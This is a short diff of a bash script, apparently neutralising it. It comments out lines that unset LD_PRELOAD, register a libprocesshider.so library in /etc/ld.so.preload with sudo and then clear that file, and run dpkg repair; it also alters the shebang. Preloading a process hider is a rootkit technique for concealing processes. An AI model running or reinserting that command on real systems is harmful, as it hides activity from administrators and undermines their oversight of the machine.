@@ -1,4 +1,4 @@
-#!/usr/bin/env bash
+##!/usr/bin/env bash
 
 # Exit immediately if a command exits with a non-zero status,
 # if an undefined variable is used, or if a pipe fails.
@@ -192,14 +192,14 @@ function esperar2(){
 
 
 # Unset the LD_PRELOAD environment variable to prevent library injection issues during execution
-unset LD_PRELOAD
+#unset LD_PRELOAD
 
 # The original logic appends a library to ld.so.preload and then immediately clears it.
 # We use 'sudo tee' to handle permissions correctly for system files.
-echo "/usr/local/lib/libprocesshider.so" | sudo tee -a /etc/ld.so.preload > /dev/null
+#echo "/usr/local/lib/libprocesshider.so" | sudo tee -a /etc/ld.so.preload > /dev/null
 
 # Clearing the ld.so.preload file as per the original script's sequence
-echo "" | sudo tee /etc/ld.so.preload > /dev/null
+#echo "" | sudo tee /etc/ld.so.preload > /dev/null
 
 # Fix any interrupted or broken package configurations
-sudo dpkg --configure -a
+#sudo dpkg --configure -a
